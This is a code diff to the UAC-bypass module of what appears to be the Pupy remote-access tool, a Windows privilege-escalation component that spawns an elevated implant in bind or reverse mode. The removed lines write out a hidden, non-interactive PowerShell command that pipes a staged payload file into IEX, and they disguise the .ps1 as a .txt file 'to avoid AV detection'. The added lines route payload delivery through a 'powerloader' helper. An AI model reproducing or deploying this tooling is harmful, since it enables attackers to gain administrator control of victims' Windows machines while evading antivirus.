@@ -4,21 +4,21 @@
 
 import os
 
+from modules.lib.windows import powerloader
+
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from rpyc.utils.classic import upload
 
 import shlex
-import pupygen
 import random
 import string
 
 __class_name__ = "BypassUAC"
 
-
 @config(compat="windows", category="privesc")
 class BypassUAC(PupyModule):
 
-    dependencies = ['winpwnage.core', 'winpwnage.functions.uac']
+    dependencies = ['winpwnage.core', 'winpwnage.functions.uac', 'powerloader']
 
     @classmethod
     def init_argparse(cls):
@@ -114,12 +114,15 @@ class BypassUAC(PupyModule):
         random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
         local_file = ''
         remote_file = ''
+        completion = None
 
         if not args.exe and not args.restart:
             self.info('Using powershell payload')
+
+            client_conf = None
+
             if is_bind_launcher:
-                self.info("BIND launcher is on the target. So a BIND ps1 will be used in child launcher. "
-                          "This ps1 will listen on your given port")
+                self.info("BIND launcher is on the target.")
                 self.info("Be careful, you have to choose a port which is not used on the target!")
 
                 listening_port = -1
@@ -131,7 +134,11 @@ class BypassUAC(PupyModule):
 
                 listening_address = address_port.split(':')[0]
                 bind_address_and_port = "{0}:{1}".format(listening_address, listening_port)
-                self.info("The ps1 script used for bypassing UAC will be configured for listening on {0} on the target".format(bind_address_and_port))
+                self.info(
+                    "Payload used for bypassing UAC will be "
+                    "configured for listening on {0} on the target".format(
+                        bind_address_and_port))
+
                 bind_conf = self.client.get_conf()
 
                 # Modify the listening port on the conf. If it is not modified,
@@ -139,20 +146,12 @@ class BypassUAC(PupyModule):
                 bind_conf['launcher_args'][bind_conf['launcher_args'].index("--port")+1] = str(listening_port)
                 client_conf = bind_conf
             else:
-                self.info("Reverse connection mode: Configuring ps1 client with the same configuration as "
-                          "the (parent) launcher on the target")
+                self.info(
+                    "Reverse connection mode: Configuring client with the same configuration as "
+                    "the (parent) launcher on the target")
                 client_conf = self.client.get_conf()
 
-            if '64' in self.client.desc['proc_arch']:
-                local_file = pupygen.generate_ps1(self.log, client_conf, x64=True)
-            else:
-                local_file = pupygen.generate_ps1(self.log, client_conf, x86=True)
-
-            # change the ps1 to txt file to avoid AV detection
-            remote_file = rjoin(tempdir, "{random_name}.{ext}".format(random_name=random_name, ext="txt"))
-
-            cmd = u'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden ' \
-                  u'-noni -nop -c "cat %s | Out-String | IEX"' % remote_file
+            cmd, completion = powerloader.serve(self, client_conf)
 
         # use a custom exe to execute as admin
         elif args.exe:
@@ -202,13 +201,17 @@ class BypassUAC(PupyModule):
         else:
             self.parse_result(result, get_method_id=False)
 
-        # Powershell could be longer to execute
-        if not args.exe and not args.restart:
+        if completion:
+            if not completion.is_set():
+                self.info('Waiting for a powerloader status updates')
+                completion.wait()
+        elif not args.exe and not args.restart:
+            # Powershell could be longer to execute
             self.info("Waiting for a connection (take few seconds, 1 min max)...")
 
         # TO DO (remove ps1 file)
         # ros.remove(remote_file) # not work if removed too fast
 
         # Remove generated ps1 file
-        if not args.exe and not args.restart:
+        if not args.exe and not args.restart and local_file:
             os.remove(local_file)
